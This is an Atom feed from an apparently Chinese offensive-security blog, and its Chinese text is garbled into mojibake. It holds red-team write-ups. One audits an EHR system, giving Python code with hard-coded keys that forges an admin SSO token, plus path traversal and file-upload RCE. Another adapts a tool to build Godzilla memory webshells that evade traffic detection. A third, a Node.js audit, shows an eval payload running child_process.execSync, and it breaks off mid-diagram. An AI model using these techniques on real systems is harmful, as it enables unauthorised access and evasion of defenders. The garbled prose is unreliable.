<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://www.svenbeast.com</id>
    <title>æ”»åŸè‚¾é€shi | sv3nbeast</title>
    <updated>2025-04-28T11:56:55.149Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://www.svenbeast.com"/>
    <link rel="self" href="https://www.svenbeast.com/atom.xml"/>
    <subtitle>Let&apos;s start learningï¼Œä¸åœ¨å¹³é™ä¸­ç­äº¡~  </subtitle>
    <logo>https://www.svenbeast.com/images/avatar.png</logo>
    <icon>https://www.svenbeast.com/favicon.ico</icon>
    <rights>All rights reserved 2025, æ”»åŸè‚¾é€shi | sv3nbeast</rights>
    <entry>
        <title type="html"><![CDATA[Javaå®¡è®¡ | æŸEHRç³»ç»Ÿä»Authç»•è¿‡åˆ°RCE]]></title>
        <id>https://www.svenbeast.com/post/7iSXkstGK7/</id>
        <link href="https://www.svenbeast.com/post/7iSXkstGK7/">
        </link>
        <updated>2025-04-28T11:13:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x00-å‡†å¤‡å·¥ä½œ">0x00 å‡†å¤‡å·¥ä½œ</h1>
<p>æ°´ä¸€ä¸ªæ¼”ç»ƒé‡åˆ°çš„æŸä¸ªEHRç³»ç»Ÿçš„å®¡è®¡è¿‡ç¨‹ï¼Œé¦–å…ˆè·å¾—ç³»ç»Ÿçš„æ‰€æœ‰è·¯ç”±ä¿¡æ¯</p>
<figure data-type="image" tabindex="1"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192323639.png" alt="image-20250427110417347" loading="lazy"></figure>
<p>æ‰¹é‡è·‘æ¥å£ï¼Œåˆ†å‡ºæ¥é‰´æƒæ¥å£å’Œæœªé‰´æƒæ¥å£</p>
<figure data-type="image" tabindex="2"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192408522.png" alt="image-20250426004220673" loading="lazy"></figure>
<p>åé¢çœ‹ä»£ç ï¼Œå‘ç°å‚æ•°éƒ½åŠ å¯†äº†ï¼Œç„¶åæ‰¾åˆ°æœ‰ä¸ªåŠ å¯†çš„æ–¹æ³•ï¼Œåé¢æˆªå›¾çš„ä»£ç é»˜è®¤éƒ½è¢«æˆ‘è¿˜åŸè¿‡äº†</p>
<figure data-type="image" tabindex="3"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192445892.png" alt="image-20250425191612052" loading="lazy"></figure>
<p>å¦‚ä¸‹</p>
<figure data-type="image" tabindex="4"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192458082.png" alt="image-20250426004301005" loading="lazy"></figure>
<pre><code>def Kayang(s):
    # åˆå§‹åŒ–å­—ç¬¦æ•°ç»„
    cArr = [''] * len(s)
    length = len(s) - 1
    i = length
    i2 = length
    # åˆå§‹åŒ– c å€¼
    c = ((2 ^ 5) &lt;&lt; 4) ^ (2 ^ 5)
    
    while i &gt;= 0:
        c2 = i2
        c3 = (c2 ^ c) &amp; 0x3F  # 0x3F æ˜¯ '?' çš„ ASCII å€¼
        cArr[c2] = chr(ord(s[i2]) ^ c)
        i3 = i2 - 1
        if i3 &lt; 0:
            break
        c = (i3 ^ c3) &amp; 0x3F
        cArr[i3] = chr(ord(s[i3]) ^ c3)
        i2 = i3 - 1
        i = i2
    
    # å°†å­—ç¬¦æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²
    return ''.join(cArr)


input_str = &quot;~EyXQ_\&quot;
output_str = Kayang(input_str)
print(&quot;Input:&quot;, input_str)
print(&quot;Output:&quot;, output_str)
</code></pre>
<figure data-type="image" tabindex="5"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192505988.png" alt="image-20250426004331958" loading="lazy"></figure>
<h1 id="0x01-å®¡è®¡è¿‡ç¨‹">0x01 å®¡è®¡è¿‡ç¨‹</h1>
<h2 id="ä»»æ„æ–‡ä»¶è¯»å–">ä»»æ„æ–‡ä»¶è¯»å–</h2>
<p>é™¤å»springMvcçš„è·¯ç”±ï¼Œå†çœ‹ä¸€ä¸‹web.xmlï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ç›´æ¥å®šä¹‰è·¯å¾„çš„è·¯ç”±ï¼Œçœ‹åˆ°äº†ä¸ªèµ„æºæ–‡ä»¶çš„ï¼Œè¿›å»çœ‹çœ‹</p>
<figure data-type="image" tabindex="6"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192513046.png" alt="image-20250427110905234" loading="lazy"></figure>
<p>ç„¶åè¿™é‡Œå¾ˆæ˜æ˜¾æœ‰ä¸ªpathå‚æ•°æœ‰é—®é¢˜</p>
<figure data-type="image" tabindex="7"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192526740.png" alt="image-20250427111110266" loading="lazy"></figure>
<p>ä¸€ä¸ª../çš„æ…¢æ…¢åŠ ä¸Šå»ï¼Œè·å¾—ä»»æ„è·¨ç›®å½•è¯»æ–‡ä»¶æ¼æ´ï¼Œè™½ç„¶å®é™…ä½œç”¨ä¸å¤§ï¼Œä¸è¿‡è¿™è¯´æ˜å…¶ä»–æ´å­˜åœ¨æ¦‚ç‡é«˜ã€‚ã€‚</p>
<figure data-type="image" tabindex="8"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192538496.png" alt="image-20250427111230356" loading="lazy"></figure>
<h2 id="ä»»æ„ç”¨æˆ·ç™»å½•">ä»»æ„ç”¨æˆ·ç™»å½•</h2>
<p>åœ¨æœªé‰´æƒæ¥å£ä¸­ä¸€çœ¼æ²¡çœ‹åˆ°ä»€ä¹ˆå¤§æ¦‚ç‡ç›´æ¥getshellçš„ï¼Œæ‰€ä»¥å»çœ‹åŒ…å«ssoå­—æ ·çš„æ¥å£ï¼Œåœ¨LoginxSSOControllerç±»ä¸­å®ç°äº†LoginSSOè·¯ç”±</p>
<figure data-type="image" tabindex="9"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192600423.png" alt="image-20250426004946963" loading="lazy"></figure>
<p>onloadå½“å‰ç±»ä¸­æ²¡æœ‰ï¼Œå†å»å½“å‰ç±»ç»§æ‰¿çš„BaseActionç±»å»çœ‹çœ‹</p>
<figure data-type="image" tabindex="10"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192613944.png" alt="image-20250426005019088" loading="lazy"></figure>
<p>æ‰¾åˆ°äº†onLoadæ–¹æ³•ï¼Œç„¶åå†è·³åˆ°onPageLoadæ–¹æ³•ï¼Œè¿™ä¸ªçˆ¶ç±»ä¸­ä¹Ÿæ²¡å®ç°ä»£ç </p>
<figure data-type="image" tabindex="11"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192638068.png" alt="image-20250426005238401" loading="lazy"></figure>
<p>åˆå›åˆ°LoginxSSOControllerç±»çœ‹åˆ°äº†onPageLoadçš„å®ç°ä»£ç ï¼Œå‘ç°1ä¸ªå…³é”®å‚æ•°accountï¼Œæœ‰ä¸ªè§£å¯†æ“ä½œï¼Œç„¶ååˆ°è¾¾autoLoginæ–¹æ³•ï¼Œå¯çŸ¥å½“å‰urlä¸º/LoginxSSO.json?account=å¯†æ–‡ï¼Œæœ€ç»ˆä¼ å…¥åˆ°autoLogin(url,account,false)</p>
<figure data-type="image" tabindex="12"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192643467.png" alt="image-20250426011523315" loading="lazy"></figure>
<p>æ‰¾åˆ°åŠ å¯†è¿‡ç¨‹ï¼Œç›´æ¥è°ƒç”¨æˆ–è€…aiå¸®ä½ è¿˜åŸä¸ªpythonè°ƒç”¨</p>
<figure data-type="image" tabindex="13"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192650433.png" alt="image-20250427112435656" loading="lazy"></figure>
<pre><code>from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import binascii

class EncryptAndDecodeUtil:
    # é™æ€å˜é‡
    Kayang = bytes([
        106, 105, 194, 29, 184, 80, 227, 145, 124, 35, 34, 166, 60, 126, 106, 195,
        193, 187, 69, 21, 59, 62, 24, 208, 173, 142, 21, 118, 103, 95, 77, 198
    ])
    B = bytes([
        202, 18, 194, 223, 133, 237, 32, 62, 249, 153, 18, 24, 67, 30, 191, 234
    ])

    @staticmethod
    def encode(content: str) -&gt; str:
        if not content:
            return &quot;&quot;
        # ä½¿ç”¨ AES åŠ å¯†
        cipher = AES.new(EncryptAndDecodeUtil.Kayang, AES.MODE_CBC, EncryptAndDecodeUtil.B)
        padded_data = pad(content.encode('utf-8'), AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)
        return binascii.hexlify(encrypted_data).decode('utf-8')

    @staticmethod
    def decode(content: str) -&gt; str:
        if not content:
            return &quot;&quot;
        try:
            # ä½¿ç”¨ AES è§£å¯†
            cipher = AES.new(EncryptAndDecodeUtil.Kayang, AES.MODE_CBC, EncryptAndDecodeUtil.B)
            encrypted_data = binascii.unhexlify(content)
            decrypted_data = cipher.decrypt(encrypted_data)
            unpadded_data = unpad(decrypted_data, AES.block_size)
            return unpadded_data.decode('utf-8')
        except Exception as e:
            try:
                # å¦‚æœ AES è§£å¯†å¤±è´¥ï¼Œå°è¯• DES è§£å¯†
                return EncryptAndDecodeUtil.decodeDES(binascii.unhexlify(content), &quot;T_E^UYYO\u0007&quot;)
            except Exception:
                # å¦‚æœ DES è§£å¯†å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨é»˜è®¤å¯†é’¥
                return EncryptAndDecodeUtil.decodeDES(binascii.unhexlify(content), &quot;kayangv9&quot;)

    @staticmethod
    def decodeDES(data: bytes, key: str) -&gt; str:
        try:
            # ä½¿ç”¨ DES è§£å¯†
            from Crypto.Cipher import DES
            key_bytes = key.encode('utf-8')
            cipher = DES.new(key_bytes, DES.MODE_ECB)
            decrypted_data = cipher.decrypt(data)
            return decrypted_data.decode('utf-8').rstrip('\0')
        except Exception as e:
            print(f&quot;Error in decodeDES: {e}&quot;)
            return &quot;&quot;

    @staticmethod
    def encodeDES(content: str, key: str) -&gt; str:
        if not content:
            return &quot;&quot;
        try:
            # ä½¿ç”¨ DES åŠ å¯†
            from Crypto.Cipher import DES
            key_bytes = key.encode('utf-8')
            cipher = DES.new(key_bytes, DES.MODE_ECB)
            padded_data = pad(content.encode('utf-8'), DES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            return binascii.hexlify(encrypted_data).decode('utf-8')
        except Exception as e:
            print(f&quot;Error in encodeDES: {e}&quot;)
            return &quot;&quot;


# æµ‹è¯•ä»£ç 
if __name__ == &quot;__main__&quot;:
    # æµ‹è¯• encode å’Œ decode
    encod_text = &quot;ttt&quot;
    encoded_text = EncryptAndDecodeUtil.encode(encod_text)
    print(f&quot;Encoded: {encoded_text}&quot;)
    decode_text = &quot;fa32fda300eeb85fc0e3116ec9a0f191&quot;
    decoded_text = EncryptAndDecodeUtil.decode(decode_text)
    print(f&quot;Decoded: {decoded_text}&quot;)

    # æµ‹è¯• encodeDES å’Œ decodeDES
    original_text = &quot;Hello, DES!&quot;
    encoded_text = EncryptAndDecodeUtil.encodeDES(original_text, &quot;kayangv9&quot;)
    print(f&quot;Encoded DES: {encoded_text}&quot;)
    decoded_text = EncryptAndDecodeUtil.decodeDES(binascii.unhexlify(encoded_text), &quot;kayangv9&quot;)
    print(f&quot;Decoded DES: {decoded_text}&quot;)
</code></pre>
<p>éšä¾¿åŠ å¯†ä¸ªtttè·å¾—ç»“æœ2972707ed0733287402a099e76285e7a</p>
<figure data-type="image" tabindex="14"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192738219.png" alt="image-20250426013150974" loading="lazy"></figure>
<p>è¯·æ±‚åæç¤ºè´¦å·ä¸å­˜åœ¨ï¼Œæœ‰ç‚¹ä¸œè¥¿å“ˆ</p>
<figure data-type="image" tabindex="15"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192743947.png" alt="image-20250426013305260" loading="lazy"></figure>
<p>ç”Ÿæˆadminè´¦å·çš„ï¼Œfa32fda300eeb85fc0e3116ec9a0f191ï¼Œå‘ç°è·³302</p>
<figure data-type="image" tabindex="16"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192749748.png" alt="image-20250426013427152" loading="lazy"></figure>
<p>æ‰¾ä¸ªå…¶ä»–é‰´æƒæ¥å£ï¼Œæµ‹è¯•ä¸‹cookieï¼Œå‘ç°æœ‰æ•ˆï¼Œè¿™å¾ˆå¥½ï¼Œåç¼€aspxå¯ä»¥å¿½ç•¥å“ˆï¼Œéšä¾¿é€‰çš„åç¼€ï¼Œæ˜¯web.xmlè®¾ç½®çš„èµ°spingmvcè®¤è¯çš„å‡ ä¸ªåç¼€ä¹‹ä¸€ï¼Œå¯èƒ½æ˜¯ä¸ºäº†è®©åˆ«äººè¯¯åˆ¤åç«¯è¯­è¨€å§</p>
<figure data-type="image" tabindex="17"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192754420.png" alt="image-20250426013602671" loading="lazy"></figure>
<figure data-type="image" tabindex="18"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192800412.png" alt="image-20250426013751687" loading="lazy"></figure>
<p>æ²¡è¿‡é‰´æƒæ˜¯å›æ˜¾è¿™ä¸ªçš„</p>
<figure data-type="image" tabindex="19"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192806473.png" alt="image-20250426013821128" loading="lazy"></figure>
<h2 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ ">ä»»æ„æ–‡ä»¶ä¸Šä¼ </h2>
<p>æ‰¾åˆ°è¿™ä¸ªæ´çš„å¤§æ¦‚è¿‡ç¨‹ï¼Œåœ¨burpçš„apiè®¿é—®è®°å½•ä¸­ä»ä¸Šåˆ°ä¸‹çœ‹äº†ä¸€äº›è·¯å¾„å¯èƒ½åŒ…å«ä¸Šä¼ åŠŸèƒ½çš„apiï¼Œä½†æ²¡æœ‰æ‰¾åˆ°èƒ½ç”¨çš„ï¼Œä¸€äº›åŸå› å¦‚ä¸‹</p>
<p>1.å†™æ­»äº†åç¼€</p>
<p>2.è¿˜æœ‰çš„æ˜¯æ£€æµ‹æ—¶é»‘åå•ï¼Œä½†ä½¿ç”¨å…¶ä»–åç¼€åå•ä¼šå¯¼è‡´å‡½æ•°ä¸è¿”å›trueï¼Œå¯¼è‡´å‡½æ•°ä¸å¾€ä¸‹èµ°</p>
<p>3.æœ‰ä¸€äº›ä¼šåœ¨è°ƒç”¨æ–‡ä»¶ä¸Šä¼ å‰å­˜åœ¨ä¸€äº›å‰ç½®æ“ä½œï¼Œå¯¼è‡´æ–¹æ³•åœæ­¢è¿è¡Œ</p>
<p>åç»­å¼€å§‹å…¨å±€æœç´¢fileOutputStream.writeï¼Œå»çœ‹çœ‹å¯¹åº”çš„æ–‡ä»¶ï¼Œæ²¡æ‰¾åˆ°</p>
<figure data-type="image" tabindex="20"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192812795.png" alt="image-20250428171632469" loading="lazy"></figure>
<p>åˆæœFileUtils.copyFile(    ï¼Œæ‰¾åˆ°ä¸€ä¸ªsaveAsæ–¹æ³•</p>
<figure data-type="image" tabindex="21"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192819354.png" alt="image-20250428171916366" loading="lazy"></figure>
<p>é€šè¿‡å¯¹saveAsæ–¹æ³•çš„è°ƒç”¨ï¼Œå®šä½åˆ°äº†æœ¬æ¬¡çš„æ¥å£ï¼Œä»£ç å¦‚ä¸‹ï¼Œåˆšå¥½åœ¨æ£€æµ‹åç¼€å‰ä»–è°ƒç”¨äº†å†…ç½®ä¸Šä¼ æ–¹æ³•ï¼Œè¿½æº¯ä¸Šå»å‘ç°åç¼€æ­£å¥½æ˜¯ä¼ å…¥çš„srcnameå‚æ•°æ§åˆ¶ï¼Œè¿™æ ·è™½ç„¶æ— æ³•å®Œå…¨è¿è¡Œå®Œæ¯•ï¼Œä½†è¿˜æ˜¯å®Œæˆäº†ä¸Šä¼ æ­¥éª¤</p>
<figure data-type="image" tabindex="22"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192825450.png" alt="image-20250428172400352" loading="lazy"></figure>
<p>åŒæ—¶ç¼“å­˜æ–‡ä»¶çš„uuidè¿˜ä¼šåœ¨å¼‚å¸¸ä¿¡æ¯ä¸­è¿”å›</p>
<figure data-type="image" tabindex="23"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192832576.png" alt="image-20250428172638271" loading="lazy"></figure>
<figure data-type="image" tabindex="24"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192837372.png" alt="image-20250428172857269" loading="lazy"></figure>
<p>å®Œæˆé—­ç¯</p>
<figure data-type="image" tabindex="25"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192842522.png" alt="image-20250428172934461" loading="lazy"></figure>
<h1 id="0x02-ç»“æŸ">0x02 ç»“æŸ</h1>
<p>æ°´æ–‡ç»“æŸï¼Œä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™æ‰èƒ½å†æ¬¡ç¢°åˆ°èµ„äº§ç”¨ä¸Šæ´</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ä¸ä¸Šçº¿ä½ æ˜¯è¿™ä¸ªğŸ‘]]></title>
        <id>https://www.svenbeast.com/post/E0Bcu3tVli/</id>
        <link href="https://www.svenbeast.com/post/E0Bcu3tVli/">
        </link>
        <updated>2025-03-31T06:24:18.000Z</updated>
        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1743404712416.gif" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Javaå·¥å…· | JMGæ·»åŠ è‡ªå®šä¹‰å†…å­˜é©¬]]></title>
        <id>https://www.svenbeast.com/post/HDu5nl4VC/</id>
        <link href="https://www.svenbeast.com/post/HDu5nl4VC/">
        </link>
        <updated>2024-08-10T10:37:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x01-åŸå› ">0x01 åŸå› </h2>
<p>â€‹		å› ä¸ºå“¥æ–¯æ‹‰é»˜è®¤ç‰ˆæœ¬è§¦å‘æµé‡è®¾å¤‡å‘Šè­¦çš„å‡ ç‡è¾ƒé«˜ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†åœºæ™¯éƒ½æ˜¯ä½¿ç”¨äºŒå¼€è¿‡çš„å“¥æ–¯æ‹‰åŠshellè¿›è¡Œç®¡ç†webshellï¼Œä¸è¿‡åœ¨ä¸€äº›javaå†…å­˜é©¬æ³¨å…¥çš„æ¼æ´ä¸Šé¢ä½¿ç”¨jmgç”Ÿæˆå†…å­˜é©¬æ—¶è¿˜æ˜¯ä¼šéœ€è¦å…ˆä½¿ç”¨é»˜è®¤ç‰ˆæœ¬å“¥æ–¯æ‹‰shellå†æ³¨å…¥äºŒå¼€ç‰ˆæœ¬çš„å“¥æ–¯æ‹‰shellï¼Œå¢åŠ å‘Šè­¦é£é™©ï¼Œæ‰€ä»¥å¾—æŠŠè‡ªå·±çš„shellåŠ åˆ°jmgé‡Œç›´æ¥ç”Ÿæˆã€‚</p>
<h2 id="0x02-æ·»åŠ jmgç”Ÿæˆshellé€‰é¡¹">0x02 æ·»åŠ JMGç”Ÿæˆshellé€‰é¡¹</h2>
<h3 id="1jmg-guiæ¨¡å—">1.jmg-guiæ¨¡å—</h3>
<p>æ·»åŠ Filter_ImageæŒ‰é’®</p>
<figure data-type="image" tabindex="1"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202408101843346.png" alt="image-20240810170834596" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202408101843117.png" alt="image-20240810171026385" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202408101843352.png" alt="image-20240810174451338" loading="lazy"></figure>
<p>æ·»åŠ ç»“æœè¾“å‡º</p>
<figure data-type="image" tabindex="4"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202408101843270.png" alt="image-20240810171722777" loading="lazy"></figure>
<h3 id="2jmg-coreæ¨¡å—">2.jmg-coreæ¨¡å—</h3>
<p>æ·»åŠ Shellç±»å‹ï¼Œèµ·åSHELL_FILTER_IMAGE</p>
<figure data-type="image" tabindex="5"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202408101843571.png" alt="image-20240810171505815" loading="lazy"></figure>
<p>æ·»åŠ ç”Ÿæˆé€»è¾‘</p>
<figure data-type="image" tabindex="6"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202408101843483.png" alt="image-20240810171906234" loading="lazy"></figure>
<p>æ·»åŠ ç”Ÿæˆé€»è¾‘</p>
<figure data-type="image" tabindex="7"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202408101843397.png" alt="image-20240810172122267" loading="lazy"></figure>
<h3 id="3jmg-godzilla">3.jmg-godzilla</h3>
<p>æ·»åŠ æŒ‡å‘shellç±»çš„ä»£ç </p>
<figure data-type="image" tabindex="8"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202408101843319.png" alt="image-20240810180704418" loading="lazy"></figure>
<p>æ–°å»ºä¸ªå†…å­˜é©¬ç±»ï¼Œç±»åå’Œå‰é¢åŠ çš„å¯¹åº”ä¸Šï¼Œè½¬æ¢ä½ ç”¨æ¥bypassæµé‡è®¾å¤‡çš„jspä»£ç ä¸ºFilterç±»å‹çš„javaä»£ç ï¼Œæˆ‘è¿™é‡Œè‚¯å®šæ˜¯å“¥æ–¯æ‹‰ç±»å‹çš„shellå’¯ï¼ŒåŠ å¯†æ–¹æ³•å’Œè§£å¯†æ–¹æ³•ç…§æ¬ï¼Œå…¶ä»–ä¹Ÿéƒ½æ˜¯ç…§æ¬è¿‡æ¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘è¿™é‡Œå½“å±æ€§ä¸ºnullæ—¶ï¼ŒsetAttributeå±æ€§çš„ä»£ç ç”¨åŸæœ¬çš„å³å¯</p>
<figure data-type="image" tabindex="9"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202408101844931.png" alt="image-20240810181502262" loading="lazy"></figure>
<h2 id="0x03-æ·»åŠ å®Œæˆ">0x03 æ·»åŠ å®Œæˆ</h2>
<p>æœ€ç»ˆæ•ˆæœï¼Œå¸®åŠ©ä½ å†…å­˜é©¬åœºæ™¯ä¸‹é˜²æ­¢ä½¿ç”¨æ™®é€šå“¥æ–¯æ‹‰shellè§¦å‘æµé‡æ£€æµ‹è®¾å¤‡çš„å‘Šè­¦</p>
<figure data-type="image" tabindex="10"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202408101844764.png" alt="image-20240810181320633" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Nodejså®¡è®¡ | æŸæ¼”ç»ƒå…¥å£ç‚¹çš„äºŒæ¬¡æ³¨å…¥RCE]]></title>
        <id>https://www.svenbeast.com/post/b_Y7hJQKj/</id>
        <link href="https://www.svenbeast.com/post/b_Y7hJQKj/">
        </link>
        <updated>2024-03-08T10:04:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x01-èƒŒæ™¯">0x01 èƒŒæ™¯</h2>
<p>â€‹		ä¹‹å‰ä¸¾è¡Œè¿‡çš„äº‘èµ„äº§çš„æ¼”ç»ƒåˆå¼€å§‹äº†ï¼Œç›®å‰æ‹¥æœ‰ç›®æ ‡æŸè®¾å¤‡çš„è€ç‰ˆæœ¬å‰å°RCEæ¼æ´ï¼Œä½†æœ¬æ¬¡å› æŸäº›åŸå› ä¸å…è®¸ä½¿ç”¨æ­¤æ¼æ´ï¼Œæ‰€ä»¥å…¥å£ç‚¹éœ€è¦é‡æ–°æ‰¾ï¼Œå‡†å¤‡æ‰¾ä¸ªæ–°æ´ï¼Œè®°å½•nodejså®¡è®¡è¿‡ç¨‹å¦‚ä¸‹</p>
<h2 id="0x02-å®¡è®¡">0x02 å®¡è®¡</h2>
<h3 id="1å‰æœŸè¿‡ç¨‹">1.å‰æœŸè¿‡ç¨‹</h3>
<p>â€‹		é¦–å…ˆæˆ‘çš„æƒ³æ³•æ˜¯å¯»æ‰¾é‚£ç§ç®€å•çš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå› ä¸ºä¹‹å‰çš„æ´å°±è›®ç®€å•çš„ï¼Œæˆ‘åšäº†å¦‚ä¸‹æ“ä½œï¼Œç›®çš„æ˜¯å®šä½è°ƒç”¨äº†å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è·¯ç”±æ–‡ä»¶</p>
<pre><code>grep -rl &quot;child_process&quot; --include=\*.js .
</code></pre>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403061539661.png" alt="image-20240306153951101" style="zoom: 33%;" />
<p>â€‹		ç„¶åé¦–å…ˆçœ‹çš„æ˜¯pingåŠŸèƒ½ï¼Œå¾ˆç®€å•çš„å®šä¹‰è·¯ç”±ï¼Œæ¥å‚ï¼Œç„¶åä¼ å…¥å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸­ï¼Œä½†å‘ç°å­˜åœ¨æ­£åˆ™è¿‡æ»¤ï¼Œç”±äºæ­£åˆ™æˆ‘éƒ½æ˜¯ç°è®°ç°å¿˜ï¼Œé‡æ–°çœ‹äº†ä¸‹ï¼Œå†™æ­»äº†\dé™åˆ¶äº†å…¶ä»–å­—ç¬¦ï¼Œæ‰€ä»¥æ¼æ´ä¸å­˜åœ¨</p>
<figure data-type="image" tabindex="1"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403061549421.png" alt="image-20240306154513368" loading="lazy"></figure>
<p>â€‹		æ¥ç€è¿‡äº†ä¸€éç­›é€‰å‡ºæ¥çš„æ‰€æœ‰å­˜åœ¨å‘½ä»¤æ³¨å…¥å‡½æ•°çš„è·¯ç”±ï¼Œæ²¡å‘ç°èƒ½ç”¨çš„ï¼Œæœ‰çš„çœ‹ç€ä»£ç æ˜¯å­˜åœ¨æ¼æ´ä½†æ˜¯å½“ç”¨åœ¨ç›®æ ‡ç½‘ç«™ä¸Šæ˜¯ä¸å­˜åœ¨æ¼æ´çš„ï¼Œæ¨æµ‹æ˜¯ç›®æ ‡æ›´æ–°äº†ç‰ˆæœ¬è¿›è¡Œä¿®å¤æ¼æ´ï¼ˆè¿™é‡Œè¿˜æ²¡æœ‰å»è·Ÿè¸ªå„ä¸ªå‡½æ•°è°ƒç”¨é“¾æ·±æŒ–ï¼‰</p>
<p>â€‹		éšå³åˆæœäº†ä¸‹nodejsçš„æ–‡ç« çŸ¥é“äº†è¿˜å¯ä»¥å¯»æ‰¾ä»£ç æ‰§è¡Œæ¼æ´ï¼Œä¹Ÿå°±æ˜¯evalå‡½æ•°ï¼Œevalå‚æ•°å¯æ§æ—¶ç›´æ¥è¿›è¡Œå¯¼å…¥å‘½ä»¤æ‰§è¡Œè¿›è¡Œè°ƒç”¨å°±è¡Œ</p>
<pre><code>http://localhost:3000/?abc=require('child_process').execSync('open -a Calculator.app', { encoding: 'utf8' })
</code></pre>
<figure data-type="image" tabindex="2"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403061556330.png" alt="image-20240306155641844" loading="lazy"></figure>
<p>â€‹		grepå¤§æ³•ä¹‹æ•…æŠ€é‡æ–½ï¼Œå®é™…å°±æœ‰2ä¸ªrouteæ–‡ä»¶å­˜åœ¨evalï¼Œå½“ç„¶åˆ«çš„æ–‡ä»¶ä¹Ÿæ˜¯è€—è´¹ç²¾åŠ›çœ‹äº†ä½†æ²¡ä¸œè¥¿ï¼Œå°±ä¸è®²äº†ï¼Œåç»­åœ¨åæ¨evalå‡½æ•°ä»£ç æ‰§è¡Œçš„è°ƒç”¨é“¾ä¸­åŒæ—¶æ‰¾åˆ°ä¸€ä¸ªå‘½ä»¤æ³¨å…¥æ¼æ´</p>
<pre><code>grep -rl &quot;eval&quot; --include=\*.js .
</code></pre>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403061625264.png" alt="image-20240306160716095" style="zoom:33%;" />
<h3 id="2ä»£ç æ‰§è¡Œ">2.ä»£ç æ‰§è¡Œ</h3>
<p>â€‹		ç„¶åå°±æ˜¯å‘ç°çš„æ¼æ´ä»evalå‡½æ•°åæ¨è°ƒç”¨é“¾è·¯åŠä¼ å‚çš„ä¼¤è„‘ç»†èƒè¿‡ç¨‹ï¼Œè°ƒç”¨é“¾ä¸­è¾ƒä¸ºé‡è¦çš„å‡½æ•°è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼Œå‡½æ•°é‡ŒåµŒå¥—çš„å…¶ä»–ä¸€äº›å‡½æ•°å°±ä¸å†™äº†</p>
<pre><code class="language-js">  +-----------------------------------------------------------------+
  | router.post('/generatorRuleMap', function (req, res)             |
  +-----------------------------------------------------------------+
                              |
                              V
  +-----------------------------------------------------------------+
  | execGetNostructureNodeAndLinks(NodeSet, startTime, ... , cb)     |
  +-----------------------------------------------------------------+
                              |
